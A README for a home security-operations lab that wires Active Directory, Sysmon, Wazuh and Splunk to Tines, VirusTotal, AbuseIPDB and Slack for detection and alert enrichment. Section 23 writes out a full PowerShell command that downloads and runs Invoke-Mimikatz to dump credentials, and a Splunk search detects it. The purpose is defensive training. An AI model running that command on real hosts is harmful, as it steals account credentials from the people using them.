# AD + Splunk + Wazuh + SOAR Enterprise Security Lab
**Date: September 07, 2026**

An end-to-end cybersecurity home lab demonstrating enterprise-style security monitoring, detection engineering, threat intelligence enrichment, and SOAR automation using Active Directory, Splunk, Wazuh, Sysmon, Tines, VirusTotal, AbuseIPDB, and Slack.

The project simulates a small enterprise SOC environment where controlled security activity is generated from Kali Linux, collected from Windows systems, analyzed through Wazuh and Splunk, enriched through threat intelligence platforms, and automated through Tines SOAR.

---

## Architecture

<img width="762" height="886" alt="AD_Splunk_Wazuh_SOAR" src="https://github.com/user-attachments/assets/a6496082-af1b-4a78-a4d2-e660d7aa505c" />

## Security monitoring flow

                    INTERNET
                       |
                       v
                  TINES SOAR
                /     |      \
               /      |       \
       VirusTotal  AbuseIPDB  Slack
              ^       ^
              |       |
              +--- Tines
                   |
              JSON Webhook
                   |
                   v
               SIEM/XDR
            +------+------+
              |         |
          Detection   Archives
              |
              v
        Investigation
              |
       +------+------+
             |             
          Windows         
             |           
           Sysmon      
             |
        +----+----+
        |         |
      Wazuh     Splunk
      Agent       UF
        |         |
        v         v
      Wazuh     Splunk
      Manager   Indexer
        |         |
        v         v
      Wazuh     Splunk
     Indexer   Enterprise

## 1. Project overview

This project implements an integrated security monitoring environment consisting of:

- Active Directory
- Windows endpoints
- SIEM/XDR
- Splunk Enterprise
- Sysmon
- Wazuh File Integrity Monitoring (FIM)
- Custom Wazuh detection rules
- Custom Splunk alert
- MITRE ATT&CK mapping
- Tines SOAR
- VirusTotal
- AbuseIPDB
- Slack
- Kali Linux for controlled security testing

The environment demonstrates the complete security monitoring lifecycle:

      Telemetry Collection
              |
              v
          Detection
              |
              v
        Investigation
              |
              v
      Threat Intelligence Enrichment
              |
              v
       Automated Notification
              |
              v
            Response

## 2. Lab objectives

The primary objectives of this project are to:

- Deploy a Wazuh SIEM/XDR environment.
- Deploy Splunk Enterprise as an additional SIEM platform.
- Configure an Active Directory domain.
- Connect Windows endpoints to the domain.
- Deploy Wazuh agents.
- Deploy Splunk Universal Forwarders.
- Configure Sysmon for high-fidelity Windows telemetry.
- Collect Windows Security, System, Application, PowerShell, and Sysmon events.
- Configure Wazuh File Integrity Monitoring.
- Enable Wazuh archives.
- Create custom Wazuh detection rules.
- Map detections to MITRE ATT&CK.
- Forward selected Wazuh/Splunk alerts to Tines.
- Enrich indicators using VirusTotal and AbuseIPDB.
- Send automated security notifications through Slack.
- Build security monitoring dashboards.
- Perform controlled attack simulations from Kali Linux.
- Investigate security events using Wazuh and Splunk.

## 3. Lab environment

| Component                | Host / IP        | Role                       |
|--------------------------|------------------|----------------------------|
| Ubuntu Security Server   | `192.168.10.40`  | Splunk + Wazuh             |
| Wazuh Server/NAT         | `192.168.169.135`| Wazuh services             |
| Domain Controller        | `192.168.10.50`  | AD + DNS + Security        |
| DC NAT                   | `192.168.169.155`| NAT address                |
| FD-PC1                   | `192.168.10.30`  | Windows endpoint            |
| FD-PC1 NAT               | `192.168.169.184`| NAT address                |
| DP-PC1                   | `192.168.10.20`  | Windows endpoint            |
| DP-PC1 NAT               | `192.168.169.226`| NAT address                |
| Kali Linux               | `192.168.10.10`  | Attacker / security testing |
| Kali NAT                 | `192.168.169.134`| NAT address                |
| Internal Network         | `192.168.169.0/24`| Lab network                |
| Tines                    | Internet         | SOAR platform              |

## 4. Network topology

The network contains:

```text
                         Internet
                            |
                         Router
                            |
                     192.168.10.0/24
                            |
          +-----------------+------------------+
          |                 |                  |
          |                 |                  |
     Ubuntu Server          DC             Windows PCs
     192.168.10.40    192.168.10.50       .20 / .30
          |
     +----+----+
     |         |
   Splunk     Wazuh

Kali Linux is connected to the same internal environment and is used to generate controlled security activity.
```

# 5. Ubuntu security server

The Ubuntu server provides the central security infrastructure.

**Ubuntu Server**
**IP Address:** `192.168.10.40`
**NAT:** `192.168.169.135`

**Services hosted on the server:**

```text
Ubuntu Server
|
+-- Splunk Enterprise
|   |
|   +-- Splunk Indexer
|
+-- Wazuh
    |
    +-- Wazuh Manager
    +-- Wazuh Indexer
    +-- Wazuh Dashboard
```
**Wazuh responsibilities**

Wazuh is responsible for:

- Endpoint monitoring
- Windows event collection
- Sysmon telemetry
- File Integrity Monitoring
- Security detection
- Custom detection rules
- MITRE ATT&CK mapping
- Alert generation
- Agent management

**Splunk responsibilities**

Splunk provides:

- Centralized event indexing
- SPL-based investigation
- Windows event analysis
- Sysmon analysis
- Security dashboards
- Correlation searches
- Detection development
- Historical event investigation
  
Running both platforms provides the ability to investigate the same endpoint activity from two SIEM perspectives.

# 6. Active Directory domain controller

The Domain Controller is the identity and authentication core of the lab.

**Domain Controller**
**IP Address:** `192.168.10.50`

**Services hosted on the server:**

```text
Domain Controller
|
+-- Active Directory
+-- DNS
+-- Windows Security Events
+-- Sysmon Events
```

**Domain:**

`local.net`

**Example domain systems:**

```text
fd-pc1.local.net
dp-pc1.local.net
```
**The Domain Controller provides:**

- User accounts
- Computer accounts
- Authentication
- Kerberos
- Group Policy
- DNS
- Domain membership
- Windows security event generation

**Important security telemetry includes:**

- Successful logons
- Failed logons
- Account creation
- Account deletion
- Account modifications
- Privilege changes
- Authentication failures
- Suspicious account activity

## 7. Windows endpoints

The lab contains two Windows endpoints.

| Endpoint | Host IP         | NAT IP            |
| -------- | --------------- | ----------------- |
| FD-PC1   | `192.168.10.30` | `192.168.169.184` |
| DP-PC1   | `192.168.10.20` | `192.168.169.226` |

### Endpoint components

Each endpoint contains:

```text
Windows Endpoint
|
+-- Sysmon
|
+-- Wazuh Agent
|
+-- Splunk Universal Forwarder
```

This creates two telemetry pipelines.

### Wazuh telemetry

```text
Windows
   |
   +-- Sysmon + Windows Events
   |
Wazuh Agent
   |
Wazuh Manager
   |
Wazuh Indexer
   |
Wazuh Dashboard
```

### Splunk telemetry

```text
Windows
   |
   +-- Sysmon + Windows Events
   |
Splunk Universal Forwarder
   |
Splunk Indexer
   |
Splunk Enterprise
```

## 8. Sysmon

Sysmon provides detailed Windows endpoint telemetry that can be used for threat detection and incident investigation.

### Important Sysmon events

| Event ID | Activity            |
| -------: | ------------------- |
|      `1` | Process creation    |
|      `3` | Network connection  |
|      `7` | Image/DLL loading   |
|     `10` | Process access      |
|     `11` | File creation       |
|     `17` | Named pipe creation |
|     `22` | DNS query           |

**The lab uses Sysmon to collect telemetry such as:**

* Process creation
* Network connections
* File creation
* Registry activity
* Process termination
* DNS queries


# 9. Wazuh server installation

Download the Wazuh installation script:

```bash
curl -sO https://packages.wazuh.com/4.14/wazuh-install.sh
```

Run the all-in-one installation:

```bash
sudo bash ./wazuh-install.sh -a
```

The `-a` option performs an all-in-one Wazuh installation.

Started the services:

```bash
sudo systemctl start wazuh-manager
sudo systemctl start wazuh-dashboard
sudo systemctl start wazuh-indexer
```

Verified:

```bash
sudo systemctl status wazuh-manager
sudo systemctl status wazuh-dashboard
sudo systemctl status wazuh-indexer
```

The Wazuh dashboard available at:

`https://192.168.169.135`

---

# 10. Configure Wazuh to collect Sysmon

On the Windows endpoint, edited:

```text
C:\Program Files (x86)\ossec-agent\ossec.conf
```

Added:

```xml
<localfile>
    <location>Microsoft-Windows-Sysmon/Operational</location>
    <log_format>eventchannel</log_format>
</localfile>
```

Restarted the Wazuh agent:

```powershell
Restart-Service Wazuh
```

Verified the service:

```powershell
Get-Service Wazuh
```

Generated a test process:

```powershell
notepad.exe
```

The resulting Sysmon event appeared in Wazuh.

Useful process fields include:

* `Image`
* `CommandLine`
* `ParentImage`
* `User`
* `Hashes`
* `ProcessId`

---

# 11. Wazuh archives

Wazuh archives allow raw event data to be retained for investigation, including events that may not generate Wazuh alerts.

Edited:

```bash
sudo nano /var/ossec/etc/ossec.conf
```

Configured the archive settings according to the deployment requirements.

Configured Filebeat:

```bash
sudo nano /etc/filebeat/filebeat.yml
```

Restarted the services:

```bash
sudo systemctl restart wazuh-manager
sudo systemctl restart filebeat
```

Verified:

```bash
sudo systemctl status wazuh-manager
sudo systemctl status filebeat
```

Created the Wazuh archive index pattern:

```text
wazuh-archives*
```

This allows archived events to be searched from the Wazuh environment.

---

# 12. Windows Wazuh agent

Download the Wazuh agent:

```powershell
Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.14.7-1.msi -OutFile $env:TEMP\wazuh-agent.msi
```

Install the agent:

```powershell
msiexec.exe /i $env:TEMP\wazuh-agent.msi /q `
WAZUH_MANAGER='192.168.169.135' `
WAZUH_AGENT_NAME='DP-PC1'
```

Start the service:

```powershell
NET START Wazuh
```

Verify:

```powershell
Get-Service Wazuh
```

The endpoint should appear under:

```text
Wazuh Dashboard
    |
    +-- Agents
```

---

# 13. File Integrity Monitoring

Wazuh FIM detects changes to monitored files and directories.

Create a test directory:

```powershell
New-Item -ItemType Directory -Path C:\CompanyData
```

Create:

```text
C:\CompanyData\payroll.txt
```

Edit:

```text
C:\Program Files (x86)\ossec-agent\ossec.conf
```

Add:

```xml
<directories realtime="yes">C:\CompanyData\</directories>
```

Restart the agent:

```powershell
Restart-Service Wazuh
```

Test the monitoring:

```text
Create payroll.txt
        |
        v
Modify payroll.txt
        |
        v
Delete payroll.txt
```

Wazuh should generate File Integrity Monitoring events describing the changes.

---

# 14. Custom detection rules

**Guest account activation**
```

Example rule:

```xml
<group name="windows,windows_security,account_changed,adduser">

  <rule id="100200" level="12">

    <if_sid>60103</if_sid>

    <field name="win.system.eventID">^4722$</field>

    <field name="win.eventdata.targetUserName">^Guest$</field>

    <description>Windows Guest account was enabled.</description>

    <mitre>

      <id>T1078.001</id>

    </mitre>

    <group>

      windows,

      windows_account_management,

      account_enabled,

      guest_account,

    </group>

  </rule>

</group>
```

The rule demonstrates:

```text
Windows Event
     |
     v
Parent Rule
     |
     v
Custom Rule 100200
     |
     v
Severity 12
     |
     v
MITRE ATT&CK T1078
```

Validated the parent rule ID and event fields against the actual event generated in the environment before deploying the custom detection.

# 15. Detection engineering

The project can be extended with custom detections for:

* Account creation
* Account deletion
* Privilege changes
* Suspicious PowerShell
* Command-line activity
* Repeated authentication failures
* Suspicious process execution
* File modifications
* Network connections

A detection engineering workflow:

```text
Raw Telemetry
     |
     v
Event Analysis
     |
     v
Detection Logic
     |
     v
Wazuh Rule
     |
     v
MITRE ATT&CK Mapping
     |
     v
Alert
     |
     v
Investigation
```

---

# 16. MITRE ATT&CK mapping

Detection mapped to MITRE ATT&CK techniques.

Example:

```text
Detection
    |
    v
T1078.001
Valid Accounts: Default Accounts
```

MITRE mapping provides additional context during security investigations and helps categorize attacker behavior.

The project can be expanded by mapping detections across areas such as:

* Execution
* Persistence
* Privilege Escalation
* Credential Access
* Discovery
* Lateral Movement
* Command and Control

Each technique will be mapped according to the behavior actually observed by the detection.

---

# 17. Wazuh to Tines integration

Create the custom integration:

```bash
sudo cp /var/ossec/integrations/shuffle \
    /var/ossec/integrations/custom-tines

sudo cp /var/ossec/integrations/shuffle \
    /var/ossec/integrations/custom-tines.py
```

Set ownership:

```bash
sudo chown root:wazuh /var/ossec/integrations/custom-tines
sudo chown root:wazuh /var/ossec/integrations/custom-tines.py
```

Reviewed the integration script and configure it specifically for Tines webhook and expected payload format.

Edited:

```bash
sudo nano /var/ossec/etc/ossec.conf
```

Added:

```xml
<integration>
    <name>custom-tines</name>
    <hook_url>https://tines-webhook-url</hook_url>
    <alert_format>json</alert_format>
    <rule_id>100101</rule_id>
</integration>
```

with the webhook generated by the Tines workflow.

The `rule_id` determines which Wazuh detection triggers the integration.

Monitor the Wazuh log:

# 18. Tines SOAR

The workflow is:

```text
Wazuh Alert
     |
     v
Tines
     |
     +------> VirusTotal
     |
     +------> AbuseIPDB
     |
     +------> Slack
```

# 19. VirusTotal enrichment

VirusTotal used to investigate supported indicators such as file hashes.

Workflow:

```text
Wazuh Alert
     |
     v
Extract File Hash
     |
     v
VirusTotal Lookup
     |
     v
Return Reputation
```

The resulting reputation information passed to the final Tines decision to Slack notification.

---

# 20. AbuseIPDB enrichment

AbuseIPDB used to investigate IP-based indicators.

Workflow:

```text
Wazuh Alert
     |
     v
Extract Source IP
     |
     v
AbuseIPDB Lookup
     |
     v
Return IP Reputation
```

The resulting reputation information passed to the final Tines decision to Slack notification.

---

# 21. Slack notification

After enrichment, Tines can send the security event to a Slack security channel.

Example notification:

```text
Security Alert

Alert:
Suspicious Windows Activity

Host:
<Host name>

Rule:
<Rule Id>

Severity:
<Number>

IOC:
<indicator>

VirusTotal:
<reputation>

AbuseIPDB:
<reputation>

MITRE ATT&CK:
T1078
```

This gives the analyst useful context without requiring every enrichment step to be performed manually.

---

# 22. Enterprise Splunk SIEM deployment and SOAR automated incident response

The project demonstrates an end-to-end security operations workflow:

```text
Endpoint Telemetry
       |
       v
Splunk Universal Forwarder
       |
       v
Splunk Enterprise
       |
       v
Detection Engineering
       |
       v
Security Alert
       |
       v
Tines SOAR
       |
       +------> VirusTotal
       |
       +------> Threat Analysis
       |
       v
Slack Notification
       |
       v
SOC Investigation
```
---

**Architecture and integration workflow**

```text
+----------------------------------------------------------+
|                   WINDOWS ENDPOINT                       |
|                                                          |
|  Windows Event Logs                                      |
|  - Security                                              |
|  - System                                                |
|  - Application                                           |
|  - PowerShell                                            |
|  - Windows Defender                                      |
|                                                          |
|  Sysmon                                                  |
|  - Process Creation                                      |
|  - Network Connections                                   |
|  - File Activity                                         |
+-----------------------------+----------------------------+
                              |
                              |
                              | TCP 9997
                              | Forwarded Telemetry
                              v
+----------------------------------------------------------+
|                   SPLUNK ENTERPRISE                     |
|                  192.168.169.135:8000                    |
|                                                          |
|  - Index: endpoint                                       |
|  - Search and Reporting                                  |
|  - SPL Detection                                         |
|  - Correlation Searches                                  |
|  - Alerting                                              |
+-----------------------------+----------------------------+
                              |
                              |
                              | Webhook
                              v
+----------------------------------------------------------+
|                       TINES SOAR                        |
|                                                          |
|  - Alert Reception                                       |
|  - IOC Extraction                                        |
|  - VirusTotal Enrichment                                 |
|  - Investigation Context                                 |
|  - Response Recommendations                              |
+-----------------------------+----------------------------+
                              |
                              |
                              | HTTP POST
                              v
+----------------------------------------------------------+
|                    SLACK SOC CHANNEL                     |
|                         #soar                            |
|                                                          |
|  - Alert Summary                                         |
|  - Severity                                              |
|  - Process Details                                       |
|  - IOC Reputation                                        |
|  - Investigation Findings                                |
|  - Response Recommendations                              |
+----------------------------------------------------------+
```

**Environment and IP architecture**

| Component       | Asset / Hostname   | IP / Network Path      | Role                               |
| --------------- | ------------------ | ---------------------- | ---------------------------------- |
| SIEM Server     | `mydfir-rashad`    | `192.168.169.135`      | Splunk Enterprise 10.4.2           |
| Splunk Web      | `mydfir-rashad`    | `192.168.169.135:8000` | Splunk Web interface               |
| Splunk Receiver | `mydfir-rashad`    | `192.168.169.135:9997` | Universal Forwarder receiver       |
| Endpoint        | `DClocal.net`      | `192.168.169.155`      | Windows monitored endpoint         |
| Endpoint        | `DP-PC1.local.net` | `192.168.169.226`      | Windows monitored endpoint         |
| Endpoint        | `FD-PC1.local.net` | `192.168.169.184`      | Windows monitored endpoint         |
| User Context    | `alex`             | Domain User            | Simulated compromised-user context |
| SOAR            | Tines              | Webhook                | Automated incident response        |
| Notification    | Slack              | `#soar`                | SOC alert destination              |

---

**Splunk Enterprise installation**

- Install the Splunk Enterprise package

Verified the downloaded package:

```bash
ls splunk-10.4.2-33c3bf42cd73-linux-amd64.deb
```

Installed the package:

```bash
sudo dpkg -i splunk-10.4.2-33c3bf42cd73-linux-amd64.deb
```

**Initialized Splunk**

Start Splunk and accept the license agreement:

```bash
cd /opt/splunk/bin
sudo ./splunk start --accept-eula
```

Enable Splunk to start automatically with systemd:

```bash
sudo ./splunk enable boot-start -user splunk
```

**Configured the receiving port**

Splunk Universal Forwarders send telemetry to the Splunk receiver over TCP port `9997`.

The Splunk Web interface available at:

```text
http://192.168.169.135:8000
```

---

**Splunk Universal Forwarder deployment**

The Windows endpoint uses Splunk Universal Forwarder to collect and forward telemetry to the Splunk Enterprise server.

Installed the Universal Forwarder:

Run:

```text
splunkforwarder-10.4.2-x64.msi
```

During installation, configure the endpoint as a forwarder connecting to an existing Splunk Enterprise instance.

**Configured the receiving indexer**

Configure:

```text
Receiving Indexer:
192.168.169.135

Port:
9997
```

**Configure telemetry collection**

Edit:

```text
%ProgramFiles%\SplunkUniversalForwarder\etc\system\local\inputs.conf
```

Example configuration:

```ini
[WinEventLog://Microsoft-Windows-Sysmon/Operational]
index = endpoint
disabled = false
renderXml = true
source = XmlWinEventLog:Microsoft-Windows-Sysmon/Operational

[WinEventLog://Microsoft-Windows-Windows Defender/Operational]
index = endpoint
disabled = false
source = Microsoft-Windows-Windows Defender/Operational
blacklist = 1151,1150,2000,1002,1001,1000

[WinEventLog://Microsoft-Windows-PowerShell/Operational]
index = endpoint
disabled = false
source = Microsoft-Windows-PowerShell/Operational
blacklist = 4100,4105,4106,40961,40962,53504

[WinEventLog://Application]
index = endpoint
disabled = false

[WinEventLog://Security]
index = endpoint
disabled = false

[WinEventLog://System]
index = endpoint
disabled = false

```

Restart the Universal Forwarder:

```powershell
Restart-Service SplunkForwarder
```

---

**Telemetry verification**

After configuring the Universal Forwarder, verified that events are arriving in Splunk.

Created and Run:

```spl
index=endpoint
```

To view the distribution of events by source:

```spl
index=endpoint
| stats count by source
```

**Observed telemetry distribution**

The lab observed approximately the following distribution:

| Source                                                       | Approximate volume |
| ------------------------------------------------------------ | -----------------: |
| `WinEventLog:Security`                                       |              80.6% |
| `XmlWinEventLog:Microsoft-Windows-Sysmon/Operational`        |              13.4% |
| `WinEventLog:System`                                         |               2.8% |
| `WinEventLog:Microsoft-Windows-Windows Defender/Operational` |               1.3% |
| `WinEventLog:Application`                                    |               1.2% |
| `WinEventLog:Microsoft-Windows-PowerShell/Operational`       |               0.7% |

This confirms that the endpoint is generating telemetry across multiple Windows security sources.

---

# 23. Threat simulation

The lab uses a controlled adversary simulation to generate telemetry that can be detected and investigated.

The simulated activity involves (AtomicTest):

```text
Compromised User
      |
      v
cmd.exe
      |
      v
powershell.exe
      |
      v
IEX / DownloadString
      |
      v
Remote PowerShell Script
      |
      v
Invoke-Mimikatz
      |
      v
Credential Dumping Attempt
```

**Simulated command**

On `DP-PC1.local.net`, the test scenario uses the following command:

```powershell
cmd.exe /c powershell.exe -NOP -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
```

This generates telemetry that can be observed through:

* Sysmon
* Windows PowerShell logs
* Windows Security logs
* Splunk

> **Lab safety:** This command should only be used in an isolated, authorized test environment.

---

# 24. Detection engineering

**Correlation search**

Used a scheduled Splunk correlation search to detect suspicious PowerShell and command-line activity.

**Saved as alert:** `Malicious Execution`

**App:** `alert`

**Schedule:**

```text
*/5 * * * *
```

**Trigger condition:**

```text
Number of Results > 0
```

**Detection SPL**

```spl
index=endpoint
(source="*Sysmon/Operational" OR source="*PowerShell/Operational")
(Image="*\\powershell.exe" OR Image="*\\cmd.exe")
("DownloadString" OR "Invoke-Mimikatz" OR "IEX")
| stats count by _time, User, Image, CommandLine, ParentImage

```

The detection looks for:

* PowerShell execution.
* `cmd.exe` execution.
* Remote content retrieval.
* `DownloadString`.
* `IEX`.
* `Invoke-Mimikatz`.
* Process lineage.

The resulting alert is forwarded to the SOAR platform through a webhook.

---

**Detection logic**

The detection pipeline can be represented as:

```text
Windows Telemetry
       |
       v
Sysmon / PowerShell Events
       |
       v
Splunk Index
       |
       v
SPL Correlation Search
       |
       v
Malicious Execution
       |
       v
Alert Trigger
       |
       v
SOAR Webhook
```

This demonstrates the transition from raw telemetry to an actionable security detection.

---

# 25. SOAR automation

The SOAR layer receives the Splunk alert and performs automated enrichment.

```text
Splunk Alert
     |
     v
Tines
     |
     +------> Parse Alert
     |
     +------> Extract IOC
     |
     +------> VirusTotal
     |
     +------> Generate Investigation Context
     |
     v
Slack
```

The automation extracts information such as:

* Hostname
* Username
* Process
* Parent process
* Command line
* URL
* Domain
* Detection rule
* Severity
* Timestamp

---

# 26. VirusTotal/AbuseIPDB enrichment

VirusTotal is used to enrich supported indicators identified by the detection.

Example workflow:

```text
Wazuh / Splunk Alert
        |
        v
Extract Indicator
        |
        v
VirusTotal/AbuseIPDB API
        |
        v
Reputation Result
        |
        v
Tines Investigation
```

For URL-based indicators, the workflow can query the URL or domain reputation and include the result in the final analyst notification.

---

# 27. Slack incident notification

After enrichment, Tines sends the investigation summary to the dedicated `#soar` Slack channel.

Example notification structure:

```text
Security Alert

Severity:
High

Host:
DP-PC1.local.net

User:
alex

Detection:
Malicious Execution

Findings:
cmd.exe spawned PowerShell, which used IEX and
Net.WebClient.DownloadString to retrieve a remote
PowerShell script.

Process:
powershell.exe

Parent Process:
cmd.exe

IOC:
<indicator>

VirusTotal:
<reputation>

MITRE ATT&CK:
T1059.001 - PowerShell
```

---

# 28. Automated investigation summary

The SOAR workflow generated the following investigation context during the simulated scenario.

**Findings**

* `cmd.exe` executed a PowerShell process.
* PowerShell used `IEX` and `Net.WebClient.DownloadString`.
* The command retrieved `Invoke-Mimikatz.ps1`.
* The script was executed with the `-DumpCreds` argument.
* VirusTotal enrichment identified the referenced URL as suspicious or malicious according to multiple vendors.

**Investigation summary**

The alert represents a PowerShell download-and-execute technique associated with credential-dumping activity.

The process chain:

```text
powershell.exe
      |
      v
cmd.exe
      |
      v
powershell.exe
```

provides useful process-lineage evidence for investigation.

The available alert data does not independently confirm whether credential dumping succeeded.

---

**5W1H investigation**

| Question  | Finding                                                          |
| --------- | ---------------------------------------------------------------- |
| **Who**   | `alex`                                                           |
| **What**  | PowerShell retrieved and executed `Invoke-Mimikatz.ps1`          |
| **When**  | `2026-09-05 06:46:27 UTC`                                        |
| **Where** | `DP-PC1.local.net`                                               |
| **Why**   | Not available from the alert data                                |
| **How**   | PowerShell download-and-execute using `IEX` and `DownloadString` |

---

**Response recommendations**

The automated investigation produced the following recommendations:

1. Block the identified malicious URL through appropriate web filtering or proxy controls.
2. Isolate `DP-PC1.local.net` if the activity is confirmed to be unauthorized.
3. Review PowerShell and process-creation telemetry surrounding the alert.
4. Investigate potential credential access and lateral movement.
5. Reset credentials associated with `alex` if compromise is confirmed.
6. Review child processes and outbound connections generated after the script execution.

---

**IOC handling**

The simulated scenario contains the following URL indicator:

```text
https://raw [.] githubusercontent [.] com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
```

The IOC should be handled as a security investigation artifact within the isolated lab.

Example automated decision:

```text
IOC Detected
     |
     v
Threat Intelligence Lookup
     |
     v
Malicious / Suspicious
     |
     v
Create Security Alert
     |
     v
Recommend Blocking
```

---

# 29. End-to-end incident response workflow

The complete workflow is:

```text
                         ATOMIC TEST / TEST ACTIVITY
                                  |
                                  v
                         WINDOWS ENDPOINT
                                  |
                    +-------------+-------------+
                    |                           |
                    v                           v
                  Sysmon                Windows Event Logs
                    |                           |
                    +-------------+-------------+
                                  |
                                  v
                       Splunk Universal Forwarder
                                  |
                                  v
                         Splunk Enterprise
                                  |
                                  v
                       SPL Detection Search
                                  |
                                  v
                           Security Alert
                                  |
                                  v
                            Tines SOAR
                                  |
                    +-------------+-------------+
                    |                           |
                    v                           v
               VirusTotal/AbuseDBIP     Investigation Logic
                    |                           |
                    +-------------+-------------+
                                  |
                                  v
                              Slack
                                  |
                                  v
                         SOC Investigation
```

---

# 30. Kali Linux security testing

Kali Linux is used as the controlled attacker/test system.

**Host IP:** `192.168.10.10`
**NAT IP:** `192.168.169.134`
**Role:** Attacker / Security Testing

The purpose is to generate controlled activity against the Windows and Active Directory environment.

The testing workflow is:

```text
Kali Linux
     |
     v
Controlled Security Activity
     |
     v
Windows / Active Directory
     |
     v
Sysmon + Windows Events
     |
     v
Wazuh + Splunk
     |
     v
Detection
     |
     v
Investigation
```

This allows the lab to demonstrate a complete SOC investigation rather than simply collecting passive logs.

---



# 31. End-to-end detection workflow

The complete detection and response workflow is:

```text
                    KALI LINUX
                         |
                         v
                Controlled Activity
                         |
                         v
                  Windows / AD
                         |
             +-----------+-----------+
             |                       |
             v                       v
           Sysmon              Windows Security
             |                       |
             +-----------+-----------+
                         |
             +-----------+-----------+
             |                       |
             v                       v
          Wazuh                   Splunk
          Agent                     UF
             |                       |
             v                       v
       Wazuh Manager          Splunk Indexer
             |                       |
             v                       v
       Wazuh Indexer          Splunk Enterprise
             |
             v
       Detection Rules
             |
             v
          Wazuh Alert
             |
             v
         Tines SOAR
             |
        +----+------+
        |           |
        v           v
   VirusTotal   AbuseIPDB
        |           |
        +----+------+
             |
             v
           Slack
             |
             v
       SOC Investigation
```

---

# 32. SOC investigation workflow

## Step 1: Identify the alert

Start with the Wazuh alert.

Review:

* Rule ID
* Severity
* Timestamp
* Agent
* Hostname
* Description
* MITRE ATT&CK

## Step 2: Identify the endpoint

Determine:

* Hostname
* Username
* Source IP
* Destination IP
* Process
* Command Line
* Timestamp

## Step 3: Investigate process activity

Review Sysmon information:

* Image
* CommandLine
* ParentImage
* User
* ProcessId
* Hashes

## Step 4: Search surrounding activity

Use Wazuh archives and Splunk to investigate events before and after the alert.

## Step 5: Enrich indicators

Use Tines to perform:

```text
Hash -> VirusTotal
IP   -> AbuseIPDB
```

## Step 6: Determine severity

Consider:

```text
Detection
    +
Endpoint Context
    +
IOC Reputation
    +
MITRE ATT&CK
```

## Step 7: Notify

Tines sends the enriched alert to Slack.

---

# 33. Dashboards

Recommended Wazuh and Splunk dashboards include:

## Authentication

* Successful Logins
* Failed Logins
* Logon Types
* Authentication Failures
* Authentication Activity by Host

## Account activity

* User Account Creation
* User Account Deletion
* Account Modifications
* Privilege Changes

## Endpoint activity

* Process Creation
* Suspicious Command Execution
* PowerShell Activity
* Sysmon Events
* Network Connections

## File Integrity Monitoring

* File Creation
* File Modification
* File Deletion
* File Hash Changes

---

# 34. Validation and testing

## Wazuh server

```bash
sudo systemctl status wazuh-manager
sudo systemctl status wazuh-indexer
sudo systemctl status wazuh-dashboard
```

## Windows agent

```powershell
Get-Service Wazuh
```

## Sysmon

Generate controlled activity:

```powershell
notepad.exe
```

Verify that Sysmon events appear in Wazuh and Splunk.

## FIM

Modify:

```text
C:\CompanyData\payroll.txt
```

Confirm that Wazuh detects the change.

## Custom detection

Generate the activity associated with the custom rule and verify that:

```text
Rule ID: 100101
```

appears in Wazuh.

## Tines

Trigger the configured Wazuh rule and verify:

```text
Wazuh
  |
  v
Tines
  |
  +--> VirusTotal
  |
  +--> AbuseIPDB
  |
  v
Slack
```

---

# 35. Troubleshooting

## Wazuh agent does not appear

Check the Windows service:

```powershell
Get-Service Wazuh
```

Verify:

* Wazuh agent is running.
* Wazuh Manager IP is correct.
* Network connectivity exists.
* The agent is registered with the manager.

Manager address:

```text
192.168.169.135
```

---

## No Sysmon events

Verify:

* Sysmon is installed.
* Sysmon is running.
* Sysmon event channel is enabled.
* `ossec.conf` is correctly configured.
* Wazuh agent has been restarted.
* Events are being generated.

Check:

```text
Microsoft-Windows-Sysmon/Operational
```

---

## FIM events are missing

Verify:

```xml
<directories realtime="yes">C:\CompanyData\</directories>
```

Restart:

```powershell
Restart-Service Wazuh
```

Modify the monitored file again.

---

## Custom Wazuh rule does not trigger

Check:

* Parent Rule ID
* Event fields
* Rule XML syntax
* Event decoder
* Event generated by the endpoint
* Rule level

Restart the Wazuh manager after configuration changes:

```bash
sudo systemctl restart wazuh-manager
```

---

## Tines integration does not trigger

Check:

```bash
sudo tail -f /var/ossec/logs/ossec.log
```

Verify:

* Integration name
* Integration script
* Tines webhook URL
* Rule ID
* Custom rule
* Wazuh manager status
* JSON payload

The configured rule must actually generate a Wazuh alert before the integration can be triggered.

---

# 36. Skills demonstrated

This project demonstrates practical experience with:

* SIEM deployment
* XDR architecture
* Active Directory security monitoring
* Windows security monitoring
* Sysmon
* Windows Event Logs
* Splunk Enterprise
* Splunk Universal Forwarder
* Wazuh
* Wazuh agents
* File Integrity Monitoring
* Custom detection engineering
* MITRE ATT&CK mapping
* Alert investigation
* Threat intelligence enrichment
* VirusTotal
* AbuseIPDB
* SOAR automation
* Tines
* Webhook integrations
* JSON alert processing
* Slack security notifications
* Security dashboards
* Log analysis
* Controlled attack simulation

---

# 37. Project outcome

The completed lab provides an end-to-end security monitoring and automation environment.

```text
                       ENDPOINTS
                           |
                        WINDOWS                      
                           |                           
                        Sysmon                    
                           |
                           v
                      SIEM / XDR
                           |
                    Detection Rules
                           |
                           v
                          ALERT
                           |
                           v
                       TINES SOAR
                           |
             +-------------+-------------+
             |             |             |
             v             v             v
        VirusTotal     AbuseIPDB       Slack
```

The lab demonstrates the complete security monitoring lifecycle:

```text
Endpoint Telemetry
       |
       v
Centralized Collection
       |
       v
Detection Engineering
       |
       v
Security Alert
       |
       v
Investigation
       |
       v
Threat Intelligence
       |
       v
SOAR Automation
       |
       v
Security Notification
```

---

# 38. Final architecture

```text
                          INTERNET
                              |
                              v
                         TINES SOAR
                      /       |       \
                     /        |        \
                    v         v         v
              VirusTotal  AbuseIPDB   Slack
                    ^         ^
                    |         |
                    +---- Tines
                         |
                    JSON Webhook
                         |
                         v
                     SIEM / XDR
                   /             \
                  /               \
           Detection             Archives
              |                    |
              v                    v
        Security Alert        Raw Telemetry
              |
              v
        Tines Automation
              |
              v
       Threat Intelligence
              |
              v
        Analyst Notification
```

**Kali Linux testing path**

```text
                    KALI LINUX
                   192.168.10.10
                         |
                         v
                 Controlled Testing
                         |
                         v
                   Windows / AD
                         |
                         v
                   SIEM Detection
```
---

# 39. Conclusion

